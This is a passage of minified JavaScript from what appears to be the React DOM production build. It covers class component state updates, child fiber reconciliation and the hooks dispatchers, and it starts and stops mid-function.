_r(e,t,n){if(e=t.effects,t.effects=null,null!==e)for(t=0;t<e.length;t++){var a=e[t],i=a.callback;if(null!==i){if(a.callback=null,a=n,"function"!==typeof i)throw Error(r(191,i));i.call(a)}}}var Fr=(new a.Component).refs;function Ur(e,t,n,a){n=null===(n=n(a,t=e.memoizedState))||void 0===n?t:O({},t,n),e.memoizedState=n,0===e.lanes&&(e.updateQueue.baseState=n)}var Wr={isMounted:function(e){return!!(e=e._reactInternals)&&qe(e)===e},enqueueSetState:function(e,t,n){e=e._reactInternals;var a=tc(),i=nc(e),r=Nr(a,i);r.payload=t,void 0!==n&&null!==n&&(r.callback=n),null!==(t=Rr(e,r,i))&&(ac(t,e,i,a),Mr(t,e,i))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var a=tc(),i=nc(e),r=Nr(a,i);r.tag=1,r.payload=t,void 0!==n&&null!==n&&(r.callback=n),null!==(t=Rr(e,r,i))&&(ac(t,e,i,a),Mr(t,e,i))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=tc(),a=nc(e),i=Nr(n,a);i.tag=2,void 0!==t&&null!==t&&(i.callback=t),null!==(t=Rr(e,i,a))&&(ac(t,e,a,n),Mr(t,e,a))}};function qr(e,t,n,a,i,r,o){return"function"===typeof(e=e.stateNode).shouldComponentUpdate?e.shouldComponentUpdate(a,r,o):!t.prototype||!t.prototype.isPureReactComponent||(!la(n,a)||!la(i,r))}function Br(e,t,n){var a=!1,i=Ti,r=t.contextType;return"object"===typeof r&&null!==r?r=Er(r):(i=Di(t)?ji:Ci.current,r=(a=null!==(a=t.contextTypes)&&void 0!==a)?Li(e,i):Ti),t=new t(n,r),e.memoizedState=null!==t.state&&void 0!==t.state?t.state:null,t.updater=Wr,e.stateNode=t,t._reactInternals=e,a&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=i,e.__reactInternalMemoizedMaskedChildContext=r),t}function Hr(e,t,n,a){e=t.state,"function"===typeof t.componentWillReceiveProps&&t.componentWillReceiveProps(n,a),"function"===typeof t.UNSAFE_componentWillReceiveProps&&t.UNSAFE_componentWillReceiveProps(n,a),t.state!==e&&Wr.enqueueReplaceState(t,t.state,null)}function Vr(e,t,n,a){var i=e.stateNode;i.props=n,i.state=e.memoizedState,i.refs=Fr,Lr(e);var r=t.contextType;"object"===typeof r&&null!==r?i.context=Er(r):(r=Di(t)?ji:Ci.current,i.context=Li(e,r)),i.state=e.memoizedState,"function"===typeof(r=t.getDerivedStateFromProps)&&(Ur(e,t,r,n),i.state=e.memoizedState),"function"===typeof t.getDerivedStateFromProps||"function"===typeof i.getSnapshotBeforeUpdate||"function"!==typeof i.UNSAFE_componentWillMount&&"function"!==typeof i.componentWillMount||(t=i.state,"function"===typeof i.componentWillMount&&i.componentWillMount(),"function"===typeof i.UNSAFE_componentWillMount&&i.UNSAFE_componentWillMount(),t!==i.state&&Wr.enqueueReplaceState(i,i.state,null),Or(e,n,i,a),i.state=e.memoizedState),"function"===typeof i.componentDidMount&&(e.flags|=4194308)}function $r(e,t,n){if(null!==(e=n.ref)&&"function"!==typeof e&&"object"!==typeof e){if(n._owner){if(n=n._owner){if(1!==n.tag)throw Error(r(309));var a=n.stateNode}if(!a)throw Error(r(147,e));var i=a,o=""+e;return null!==t&&null!==t.ref&&"function"===typeof t.ref&&t.ref._stringRef===o?t.ref:(t=function(e){var t=i.refs;t===Fr&&(t=i.refs={}),null===e?delete t[o]:t[o]=e},t._stringRef=o,t)}if("string"!==typeof e)throw Error(r(284));if(!n._owner)throw Error(r(290,e))}return e}function Gr(e,t){throw e=Object.prototype.toString.call(t),Error(r(31,"[object Object]"===e?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function Xr(e){return(0,e._init)(e._payload)}function Qr(e){function t(t,n){if(e){var a=t.deletions;null===a?(t.deletions=[n],t.flags|=16):a.push(n)}}function n(n,a){if(!e)return null;for(;null!==a;)t(n,a),a=a.sibling;return null}function a(e,t){for(e=new Map;null!==t;)null!==t.key?e.set(t.key,t):e.set(t.index,t),t=t.sibling;return e}function i(e,t){return(e=Rc(e,t)).index=0,e.sibling=null,e}function o(t,n,a){return t.index=a,e?null!==(a=t.alternate)?(a=a.index)<n?(t.flags|=2,n):a:(t.flags|=2,n):(t.flags|=1048576,n)}function s(t){return e&&null===t.alternate&&(t.flags|=2),t}function l(e,t,n,a){return null===t||6!==t.tag?((t=_c(n,e.mode,a)).return=e,t):((t=i(t,n)).return=e,t)}function c(e,t,n,a){var r=n.type;return r===S?d(e,t,n.props.children,a,n.key):null!==t&&(t.elementType===r||"object"===typeof r&&null!==r&&r.$$typeof===D&&Xr(r)===t.type)?((a=i(t,n.props)).ref=$r(e,t,n),a.return=e,a):((a=Mc(n.type,n.key,n.props,null,e.mode,a)).ref=$r(e,t,n),a.return=e,a)}function u(e,t,n,a){return null===t||4!==t.tag||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?((t=Fc(n,e.mode,a)).return=e,t):((t=i(t,n.children||[])).return=e,t)}function d(e,t,n,a,r){return null===t||7!==t.tag?((t=zc(n,e.mode,a,r)).return=e,t):((t=i(t,n)).return=e,t)}function p(e,t,n){if("string"===typeof t&&""!==t||"number"===typeof t)return(t=_c(""+t,e.mode,n)).return=e,t;if("object"===typeof t&&null!==t){switch(t.$$typeof){case k:return(n=Mc(t.type,t.key,t.props,null,e.mode,n)).ref=$r(e,null,t),n.return=e,n;case x:return(t=Fc(t,e.mode,n)).return=e,t;case D:return p(e,(0,t._init)(t._payload),n)}if(te(t)||M(t))return(t=zc(t,e.mode,n,null)).return=e,t;Gr(e,t)}return null}function h(e,t,n,a){var i=null!==t?t.key:null;if("string"===typeof n&&""!==n||"number"===typeof n)return null!==i?null:l(e,t,""+n,a);if("object"===typeof n&&null!==n){switch(n.$$typeof){case k:return n.key===i?c(e,t,n,a):null;case x:return n.key===i?u(e,t,n,a):null;case D:return h(e,t,(i=n._init)(n._payload),a)}if(te(n)||M(n))return null!==i?null:d(e,t,n,a,null);Gr(e,n)}return null}function f(e,t,n,a,i){if("string"===typeof a&&""!==a||"number"===typeof a)return l(t,e=e.get(n)||null,""+a,i);if("object"===typeof a&&null!==a){switch(a.$$typeof){case k:return c(t,e=e.get(null===a.key?n:a.key)||null,a,i);case x:return u(t,e=e.get(null===a.key?n:a.key)||null,a,i);case D:return f(e,t,n,(0,a._init)(a._payload),i)}if(te(a)||M(a))return d(t,e=e.get(n)||null,a,i,null);Gr(t,a)}return null}function m(i,r,s,l){for(var c=null,u=null,d=r,m=r=0,g=null;null!==d&&m<s.length;m++){d.index>m?(g=d,d=null):g=d.sibling;var y=h(i,d,s[m],l);if(null===y){null===d&&(d=g);break}e&&d&&null===y.alternate&&t(i,d),r=o(y,r,m),null===u?c=y:u.sibling=y,u=y,d=g}if(m===s.length)return n(i,d),ir&&Ki(i,m),c;if(null===d){for(;m<s.length;m++)null!==(d=p(i,s[m],l))&&(r=o(d,r,m),null===u?c=d:u.sibling=d,u=d);return ir&&Ki(i,m),c}for(d=a(i,d);m<s.length;m++)null!==(g=f(d,i,m,s[m],l))&&(e&&null!==g.alternate&&d.delete(null===g.key?m:g.key),r=o(g,r,m),null===u?c=g:u.sibling=g,u=g);return e&&d.forEach((function(e){return t(i,e)})),ir&&Ki(i,m),c}function g(i,s,l,c){var u=M(l);if("function"!==typeof u)throw Error(r(150));if(null==(l=u.call(l)))throw Error(r(151));for(var d=u=null,m=s,g=s=0,y=null,b=l.next();null!==m&&!b.done;g++,b=l.next()){m.index>g?(y=m,m=null):y=m.sibling;var w=h(i,m,b.value,c);if(null===w){null===m&&(m=y);break}e&&m&&null===w.alternate&&t(i,m),s=o(w,s,g),null===d?u=w:d.sibling=w,d=w,m=y}if(b.done)return n(i,m),ir&&Ki(i,g),u;if(null===m){for(;!b.done;g++,b=l.next())null!==(b=p(i,b.value,c))&&(s=o(b,s,g),null===d?u=b:d.sibling=b,d=b);return ir&&Ki(i,g),u}for(m=a(i,m);!b.done;g++,b=l.next())null!==(b=f(m,i,g,b.value,c))&&(e&&null!==b.alternate&&m.delete(null===b.key?g:b.key),s=o(b,s,g),null===d?u=b:d.sibling=b,d=b);return e&&m.forEach((function(e){return t(i,e)})),ir&&Ki(i,g),u}return function e(a,r,o,l){if("object"===typeof o&&null!==o&&o.type===S&&null===o.key&&(o=o.props.children),"object"===typeof o&&null!==o){switch(o.$$typeof){case k:e:{for(var c=o.key,u=r;null!==u;){if(u.key===c){if((c=o.type)===S){if(7===u.tag){n(a,u.sibling),(r=i(u,o.props.children)).return=a,a=r;break e}}else if(u.elementType===c||"object"===typeof c&&null!==c&&c.$$typeof===D&&Xr(c)===u.type){n(a,u.sibling),(r=i(u,o.props)).ref=$r(a,u,o),r.return=a,a=r;break e}n(a,u);break}t(a,u),u=u.sibling}o.type===S?((r=zc(o.props.children,a.mode,l,o.key)).return=a,a=r):((l=Mc(o.type,o.key,o.props,null,a.mode,l)).ref=$r(a,r,o),l.return=a,a=l)}return s(a);case x:e:{for(u=o.key;null!==r;){if(r.key===u){if(4===r.tag&&r.stateNode.containerInfo===o.containerInfo&&r.stateNode.implementation===o.implementation){n(a,r.sibling),(r=i(r,o.children||[])).return=a,a=r;break e}n(a,r);break}t(a,r),r=r.sibling}(r=Fc(o,a.mode,l)).return=a,a=r}return s(a);case D:return e(a,r,(u=o._init)(o._payload),l)}if(te(o))return m(a,r,o,l);if(M(o))return g(a,r,o,l);Gr(a,o)}return"string"===typeof o&&""!==o||"number"===typeof o?(o=""+o,null!==r&&6===r.tag?(n(a,r.sibling),(r=i(r,o)).return=a,a=r):(n(a,r),(r=_c(o,a.mode,l)).return=a,a=r),s(a)):n(a,r)}}var Yr=Qr(!0),Jr=Qr(!1),Kr={},Zr=Ii(Kr),eo=Ii(Kr),to=Ii(Kr);function no(e){if(e===Kr)throw Error(r(174));return e}function ao(e,t){switch(Pi(to,t),Pi(eo,e),Pi(Zr,Kr),e=t.nodeType){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:le(null,"");break;default:t=le(t=(e=8===e?t.parentNode:t).namespaceURI||null,e=e.tagName)}Ei(Zr),Pi(Zr,t)}function io(){Ei(Zr),Ei(eo),Ei(to)}function ro(e){no(to.current);var t=no(Zr.current),n=le(t,e.type);t!==n&&(Pi(eo,e),Pi(Zr,n))}function oo(e){eo.current===e&&(Ei(Zr),Ei(eo))}var so=Ii(0);function lo(e){for(var t=e;null!==t;){if(13===t.tag){var n=t.memoizedState;if(null!==n&&(null===(n=n.dehydrated)||"$?"===n.data||"$!"===n.data))return t}else if(19===t.tag&&void 0!==t.memoizedProps.revealOrder){if(0!==(128&t.flags))return t}else if(null!==t.child){t.child.return=t,t=t.child;continue}if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var co=[];function uo(){for(var e=0;e<co.length;e++)co[e]._workInProgressVersionPrimary=null;co.length=0}var po=v.ReactCurrentDispatcher,ho=v.ReactCurrentBatchConfig,fo=0,mo=null,go=null,yo=null,bo=!1,wo=!1,vo=0,ko=0;function xo(){throw Error(r(321))}function So(e,t){if(null===t)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!sa(e[n],t[n]))return!1;return!0}function Io(e,t,n,a,i,o){if(fo=o,mo=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,po.current=null===e||null===e.memoizedState?ss:ls,e=n(a,i),wo){o=0;do{if(wo=!1,vo=0,25<=o)throw Error(r(301));o+=1,yo=go=null,t.updateQueue=null,po.current=cs,e=n(a,i)}while(wo)}if(po.current=os,t=null!==go&&null!==go.next,fo=0,yo=go=mo=null,bo=!1,t)throw Error(r(300));return e}function Eo(){var e=0!==vo;return vo=0,e}function Po(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return null===yo?mo.memoizedState=yo=e:yo=yo.next=e,yo}function To(){if(null===go){var e=mo.alternate;e=null!==e?e.memoizedState:null}else e=go.next;var t=null===yo?mo.memoizedState:yo.next;if(null!==t)yo=t,go=e;else{if(null===e)throw Error(r(310));e={memoizedState:(go=e).memoizedState,baseState:go.baseState,baseQueue:go.baseQueue,queue:go.queue,next:null},null===yo?mo.memoizedState=yo=e:yo=yo.next=e}return yo}function Co(e,t){return"function"===typeof t?t(e):t}function Ao(e){var t=To(),n=t.queue;if(null===n)throw Error(r(311));n.lastRenderedReducer=e;var a=go,i=a.baseQueue,o=n.pending;if(null!==o){if(null!==i){var s=i.next;i.next=o.next,o.next=s}a.baseQueue=i=o,n.pending=null}if(null!==i){o=i.next,a=a.baseState;var l=s=null,c=null,u=o;do{var d=u.lane;if((fo&d)===d)null!==c&&(c=c.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),a=u.hasEagerState?u.eagerState:e(a,u.action);else{var p={lane:d,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};null===c?(l=c=p,s=a):c=c.next=p,mo.lanes|=d,Ol|=d}u=u.next}while(null!==u&&u!==o);null===c?s=a:c.next=l,sa(a,t.memoizedState)||(vs=!0),t.memoizedState=a,t.baseState=s,t.baseQueue=c,n.lastRenderedState=a}if(null!==(e=n.interleaved)){i=e;do{o=i.lane,mo.lanes|=o,Ol|=o,i=i.next}while(i!==e)}else null===i&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function jo(e){var t=To(),n=t.queue;if(null===n)throw Error(r(311));n.lastRenderedReducer=e;var a=n.dispatch,i=n.pending,o=t.memoizedState;if(null!==i){n.pending=null;var s=i=i.next;do{o=e(o,s.action),s=s.next}while(s!==i);sa(o,t.memoizedState)||(vs=!0),t.memoizedState=o,null===t.baseQueue&&(t.baseState=o),n.lastRenderedState=o}return[o,a]}function Lo(){}function Do(e,t){var n=mo,a=To(),i=t(),o=!sa(a.memoizedState,i);if(o&&(a.memoizedState=i,vs=!0),a=a.queue,Ho(Mo.bind(null,n,a,e),[e]),a.getSnapshot!==t||o||null!==yo&&1&yo.memoizedState.tag){if(n.flags|=2048,Fo(9,Ro.bind(null,n,a,i,t),void 0,null),null===jl)throw Error(r(349));0!==(30&fo)||No(n,t,i)}return i}function No(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},null===(t=mo.updateQueue)?(t={lastEffect:null,stores:null},mo.updateQueue=t,t.stores=[e]):null===(n=t.stores)?t.stores=[e]:n.push(e)}function Ro(e,t,n,a){t.value=n,t.getSnapshot=a,zo(t)&&Oo(e)}function Mo(e,t,n){return n((function(){zo(t)&&Oo(e)}))}function zo(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!sa(e,n)}catch(a){return!0}}function Oo(e){var t=Ar(e,1);null!==t&&ac(t,e,1,-1)}function _o(e){var t=Po();return"function"===typeof e&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Co,lastRenderedState:e},t.queue=e,e=e.dispatch=ns.bind(null,mo,e),[t.memoizedState,e]}function Fo(e,t,n,a){return e={tag:e,create:t,destroy:n,deps:a,next:null},null===(t=mo.updateQueue)?(t={lastEffect:null,stores:null},mo.updateQueue=t,t.lastEffect=e.next=e):null===(n=t.lastEffect)?t.lastEffect=e.next=e:(a=n.next,n.next=e,e.next=a,t.lastEffect=e),e}function Uo(){return To().memoizedState}function Wo(e,t,n,a){var i=Po();mo.flags|=e,i.memoizedState=Fo(1|t,n,void 0,void 0===a?null:a)}function qo(e,t,n,a){var i=To();a=void 0===a?null:a;var r=void 0;if(null!==go){var o=go.memoizedState;if(r=o.destroy,null!==a&&So(a,o.deps))return void(i.memoizedState=Fo(t,n,r,a))}mo.flags|=e,i.memoizedState=Fo(1|t,n,r,a)}function Bo(e,t){return Wo(8390656,8,e,t)}function Ho(e,t){return qo(2048,8,e,t)}function Vo(e,t){return qo(4,2,e,t)}function $o(e,t){return qo(4,4,e,t)}function Go(e,t){return"function"===typeof t?(e=e(),t(e),function(){t(null)}):null!==t&&void 0!==t?(e=e(),t.current=e,function(){t.current=null}):void 0}function Xo(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,qo(4,4,Go.bind(null,t,e),n)}function Qo(){}function Yo(e,t){var n=To();t=void 0===t?null:t;var a=n.memoizedState;return null!==a&&null!==t&&So(t,a[1])?a[0]:(n.memoizedState=[e,t],e)}function Jo(e,t){var n=To();t=void 0===t?null:t;var a=n.memoizedState;return null!==a&&null!==t&&So(t,a[1])?a[0]:(e=e(),n.memoizedState=[e,t],e)}function Ko(e,t,n){return 0===(21&fo)?(e.baseState&&(e.baseState=!1,vs=!0),e.memoizedState=n):(sa(n,t)||(n=mt(),mo.lanes|=n,Ol|=n,e.baseState=!0),t)}function Zo(e,t){var n=wt;wt=0!==n&&4>n?n:4,e(!0);var a=ho.transition;ho.transition={};try{e(!1),t()}finally{wt=n,ho.transition=a}}function es(){return To().memoizedState}function ts(e,t,n){var a=nc(e);if(n={lane:a,action:n,hasEagerState:!1,eagerState:null,next:null},as(e))is(t,n);else if(null!==(n=Cr(e,t,n,a))){ac(n,e,a,tc()),rs(n,t,a)}}function ns(e,t,n){var a=nc(e),i={lane:a,action:n,hasEagerState:!1,eagerState:null,next:null};if(as(e))is(t,i);else{var r=e.alternate;if(0===e.lanes&&(null===r||0===r.lanes)&&null!==(r=t.lastRenderedReducer))try{var o=t.lastRenderedState,s=r(o,n);if(i.hasEagerState=!0,i.eagerState=s,sa(s,o)){var l=t.interleaved;return null===l?(i.next=i,Tr(t)):(i.next=l.next,l.next=i),void(t.interleaved=i)}}catch(c){}null!==(n=Cr(e,t,i,a))&&(ac(n,e,a,i=tc()),rs(n,t,a))}}function as(e){var t=e.alternate;return e===mo||null!==t&&t===mo}function is(e,t){wo=bo=!0;var n=e.pending;null===n?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function rs(e,t,n){if(0!==(4194240&n)){var a=t.lanes;n|=a&=e.pendingLanes,t.lanes=n,bt(e,n)}}var os={readContext:Er,useCallback:xo,useContext:xo,useEffect:xo,useImperativeHandle:xo,useInsertionEffect:xo,useLayoutEffect:xo,useMemo:xo,useReducer:xo,useRef:xo,useState:xo,useDebugValue:xo,useDeferredValue:xo,useTransition:xo,useMutableSource:xo,useSyncExternalStore:xo,useId:xo,unstable_isNewReconciler:!1},ss={readContext:Er,useCallback:function(e,t){return Po().memoizedState=[e,void 0===t?null:t],e},useContext:Er,useEffect:Bo,useImperativeHandle:function(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,Wo(4194308,4,Go.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Wo(4194308,4,e,t)},useInsertionEffect:function(e,t){return Wo(4,2,e,t)},useMemo:function(e,t){var n=Po();return t=void 0===t?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var a=Po();return t=void 0!==n?n(t):t,a.memoizedState=a.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},a.queue=e,e=e.dispatch=ts.bind(null,mo,e),[a.memoizedState,e]},useRef:function(e){return e={current:e},Po().memoizedState=e},useState:_o,useDebugValue:Qo,useDeferredValue:function(e){return Po().memoizedState=e},useTransition:function(){var e=_o(!1),t=e[0];return e=Zo.bind(null,e[1]),Po().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var a=mo,i=Po();if(ir){if(void 0===n)throw Error(r(407));n=n()}else{if(n=t(),null===jl)throw Error(r(349));0!==(30&fo)||No(a,t,n)}i.memoizedState=n;var o={value:n,getSnapshot:t};return i.queue=o,Bo(Mo.bind(null,a,o,e),[e]),a.flags|=2048,Fo(9,Ro.bind(null,a,o,n,t),void 0,null),n},useId:function(){var e=Po(),t=jl.identifierPrefix;if(ir){var n=Ji;t=":"+t+"R"+(n=(Yi&~(1<<32-ot(Yi)-1)).toString(32)+n),0<(n=vo++)&&(t+="H"+n.toString(32)),t+=":"}else t=":"+t+"r"+(n=ko++).toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},ls={readContext:Er,useCallback:Yo,useContext:Er,useEffect:Ho,useImperativeHandle:Xo,useInsertionEffect:Vo,useLayoutEffect:$o,useMemo:Jo,useReducer:Ao,useRef:Uo,useState:function(){return Ao(Co)},useDebugValue:Qo,useDeferredValue:function(e){return Ko(To(),go.memoizedState,e)},useTransition:function(){return[Ao(Co)[0],To().memoizedState]},useMutableSource:Lo,useSyncExternalStore:Do,useId:es,unstable_isNewReconciler:!1},cs={readContext:Er,useCallback:Yo,useContext:Er,useEffect:Ho,useImperativeHandle:Xo,useInsertionEffect:Vo,useLayoutEffect:$o,useMemo:Jo,useReducer:jo,useRef:Uo,useState:function(){return jo(Co)},useDebugValue:Qo,useDeferredValue:function(e){var t=To();return null===go?t.memoizedState=e:Ko(t,go.memoizedState,e)},useTransition:function(){return[jo(Co)[0],To().memoizedState]},useMutableSource:Lo,useSyncExternalStore:Do,useId:es,unstable_isNewReconciler:!1};function us(e,t){try{var n="",a=t;do{n+=W(a),a=a.return}while(a);var i=n}catch(r){i="\nError generating stack: "+r.message+"\n"+r.stack}return{value:e,source:t,stack:i,digest:null}}function ds(e,t,n){return{value:e,source:null,stack:null!=n?n:null,digest:null!=t?t:null}}function ps(e,t){try{console.error(t.value)}catch(n){setTimeout((function(){throw n}))}}var hs="function"===typeof WeakMap?WeakMap:Map;function fs(e,t,n){(n=Nr(-1,n)).tag=3,n.payload={element:null};var a=t.value;return n.callback=function(){Vl||(Vl=!0,$l=a),ps(0,t)},n}function ms(e,t,n){(n=Nr(-1,n)).tag=3;var a=e.type.getDerivedStateFromError;if("function"===typeof a){var i=t.value;n.payload=function(){return a(i)},n.callback=function(){ps(0,t)}}var r=e.stateNode;return null!==r&&"function"===typeof r.componentDidCatch&&(n.callback=function(){ps(0,t),"function"!==typeof a&&(null===Gl?Gl=new Set([this]):Gl.add(this));var e=t.stack;this.componentDidCatch(t.value,{componentStack:null!==e?e:""})}),n}function gs(e,t,n){var a=e.pingCache;if(null===a){a=e.pingCache=new hs;var i=new Set;a.set(t,i)}else void 0===(i=a.get(t))&&(i=new Set,a.set(t,i));i.has(n)||(i.add(n),e=Pc.bind(null,e,t,n),t.then(e,e))}function ys(e){do{var t;if((t=13===e.tag)&&(t=null===(t=e.memoizedState)||null!==t.dehydrated),t)return e;e=e.return}while(null!==e);return null}function bs(e,t,n,a,i){return 0===(1&e.mode)?(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,1===n.tag&&(null===n.alternate?n.tag=17:((t=Nr(-1,1)).tag=2,Rr(n,t,1))),n.lanes|=1),e):(e.flags|=65536,e.lanes=i,e)}var ws=v.ReactCurrentOwner,vs=!1;function ks(e,t,n,a){t.child=null===e?Jr(t,null,n,a):Yr(t,e.child,n,a)}function xs(e,t,n,a,i){n=n.render;var r=t.ref;return Ir(t,i),a=Io(e,t,n,a,r,i),n=Eo(),null===e||vs?(ir&&n&&er(t),t.flags|=1,ks(e,t,a,i),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~i,Vs(e,t,i))}function Ss(e,t,n,a,i){if(null===e){var r=n.type;return"function"!==typeof r||Nc(r)||void 0!==r.defaultProps||null!==n.compare||void 0!==n.defaultProps?((e=Mc(n.type,null,a,t,t.mode,i)).ref=t.ref,e.return=t,t.child=e):(t.tag=15,t.type=r,Is(e,t,r,a,i))}if(r=e.child,0===(e.lanes&i)){var o=r.memoizedProps;if((n=null!==(n=n.compare)?n:la)(o,a)&&e.ref===t.ref)return Vs(e,t,i)}return t.flags|=1,(e=Rc(r,a)).ref=t.ref,e.return=t,t.child=e}function Is(e,t,n,a,i){if(null!==e){var r=e.memoizedProps;if(la(r,a)&&e.ref===t.ref){if(vs=!1,t.pendingProps=a=r,0===(e.lanes&i))return t.lanes=e.lanes,Vs(e,t,i);0!==(131072&e.flags)&&(vs=!0)}}return Ts(e,t,n,a,i)}function Es(e,t,n){var a=t.pendingProps,i=a.children,r=null!==e?e.memoizedState:null;if("hidden"===a.mode)if(0===(1&t.mode))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},Pi(Rl,Nl),Nl|=n;else{if(0===(1073741824&n))return e=null!==r?r.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,Pi(Rl,Nl),Nl|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},a=null!==r?r.baseLanes:n,Pi(Rl,Nl),Nl|=a}else null!==r?(a=r.baseLanes|n,t.memoizedState=null):a=n,Pi(Rl,Nl),Nl|=a;return ks(e,t,i,n),t.child}function Ps(e,t){var n=t.ref;(null===e&&null!==n||null!==e&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function Ts(e,t,n,a,i){var r=Di(n)?ji:Ci.current;return r=Li(t,r),Ir(t,i),n=Io(e,t,n,a,r,i),a=Eo(),null===e||vs?(ir&&a&&er(t),t.flags|=1,ks(e,t,n,i),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~i,Vs(e,t,i))}function Cs(e,t,n,a,i){if(Di(n)){var r=!0;zi(t)}else r=!1;if(Ir(t,i),null===t.stateNode)Hs(e,t),Br(t,n,a),Vr(t,n,a,i),a=!0;else if(null===e){var o=t.stateNode,s=t.memoizedProps;o.props=s;var l=o.context,c=n.contextType;"object"===typeof c&&null!==c?c=Er(c):c=Li(t,c=Di(n)?ji:Ci.current);var u=n.getDerivedStateFromProps,d="function"===typeof u||"function"===typeof o.getSnapshotBeforeUpdate;d||"function"!==typeof o.UNSAFE_componentWillReceiveProps&&"function"!==typeof o.componentWillReceiveProps||(s!==a||l!==c)&&Hr(t,o,a,c),jr=!1;var p=t.memoizedState;o.state=p,Or(t,a,o,i),l=t.memoizedState,s!==a||p!==l||Ai.current||jr?("function"===typeof u&&(Ur(t,n,u,a),l=t.memoizedState),(s=jr||qr(t,n,s,a,p,l,c))?(d||"function"!==typeof o.UNSAFE_componentWillMount&&"function"!==typeof o.componentWillMount||("function"===typeof o.componentWillMount&&o.componentWillMount(),"function"===typeof o.UNSAFE_componentWillMount&&o.UNSAFE_componentWillMount()),"function"===typeof o.componentDidMount&&(t.flags|=4194308)):("function"===typeof o.componentDidMount&&(t.flags|=4194308),t.memoizedProps=a,t.memoizedState=l),o.props=a,o.state=l,o.context=c,a=s):("function"===typeof o.componentDidMount&&(t.flags|=4194308),a=!1)}else{o=t.stateNode,Dr(e,t),s=t.memoizedProps,c=t.type===t.elementType?s:gr(t.type,s),o.props=c,d=t.pendingProps,p=o.context,"object"===typeof(l=n.contextType)&&null!==l?l=Er(l):l=Li(t,l=Di(n)?ji:Ci.current);var h=n.getDerivedStateFromProps;(u="function"===typeof h||"function"===typeof o.getSnapshotBeforeUpdate)||"function"!==typeof o.UNSAFE_componentWillReceiveProps&&"function"!==typeof o.componentWillReceiveProps||(s!==d||p!==l)&&Hr(t,o,a,l),jr=!1,p=t.memoizedState,o.state=p,Or(t,a,o,i);var f=t.memoizedState;s!==d||p!==f||Ai.current||jr?("function"===typeof h&&(Ur(t,n,h,a),f=t.memoizedState),(c=jr||qr(t,n,c,a,p,f,l)||!1)?(u||"function"!==typeof o.UNSAFE_componentWillUpdate&&"function"!==typeof o.componentWillUpdate||("function"===typeof o.componentWillUpdate&&o.componentWillUpdate(a,f,l),"function"===typeof o.UNSAFE_componentWillUpdate&&o.UNSAFE_componentWillUpdate(a,f,l)),"function"===typeof o.componentDidUpdate&&(t.flags|=4),"function"===typeof o.getSnapshotBeforeUpdate&&(t.flags|=1024)):("function"!==typeof o.componentDidUpdate||s===e.memoizedProps&&p===e.memoizedState||(t.flags|=4),"function"!==typeof o.getSnapshotBeforeUpdate||s===e.memoizedProps&&p===e.memoizedState||(t.flags|=1024),t.memoizedProps=a,t.memoizedState=f),o.props=a,o.state=f,o.context=l,a=c):("function"!==typeof o.componentDidUpdate||s===e.memoizedProps&&p===e.memoizedState||(t.flags|=4),"function"!==typeof o.getSnapshotBeforeUpdate||s===e.memoizedProps&&p===e.memoizedState||(t.flags|=1024),a=!1)}return As(e,t,n,a,r,i)}function As(e,t,n,a,i,r){Ps(e,t);var o=0!==(128&t.flags);if(!a&&!o)return i&&Oi(t,n,!1),Vs(e,t,r);a=t.stateNode,ws.current=t;var s=o&&"function"!==typeof n.getDerivedStateFromError?null:a.render();return t.flags|=1,null!==e&&o?(t.child=Yr(t,e.child,null,r),t.child=Yr(t,null,s,r)):ks(e,t,s,r),t.memoizedState=a.state,i&&Oi(t,n,!0),t.child}function js(e){var t=e.stateNode;t.pendingContext?Ri(0,t.pendingContext,t.pendingContext!==t.context):t.context&&Ri(0,t.context,!1),ao(e,t.containerInfo)}function Ls(e,t,n,a,i){return hr(),fr(i),t.flags|=256,ks(e,t,n,a),t.child}var Ds,Ns,Rs,Ms,zs={dehydrated:null,treeContext:null,retryLane:0};function Os(e){return{baseLanes:e,cachePool:null,transitions:null}}function _s(e,t,n){var a,i=t.pendingProps,o=so.current,s=!1,l=0!==(128&t.flags);if((a=l)||(a=(null===e||null!==e.memoizedState)&&0!==(2&o)),a?(s=!0,t.flags&=-129):null!==e&&null===e.memoizedState||(o|=1),Pi(so,1&o),null===e)return 